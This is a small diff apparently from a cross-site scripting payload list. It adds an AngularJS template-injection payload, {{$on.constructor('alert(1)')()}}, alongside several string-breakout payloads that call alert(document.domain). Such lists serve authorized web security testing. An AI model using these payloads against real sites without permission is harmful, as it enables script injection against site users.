@@ -4,6 +4,7 @@
 '-alert(document.domain)-'
 '-alert(document.domain)'
 ';alert(document.domain)//
+{{$on.constructor('alert(1)')()}}
 ';alert(document.domain)//
 \';alert(document.domain)//
 \\';alert(document.domain)//
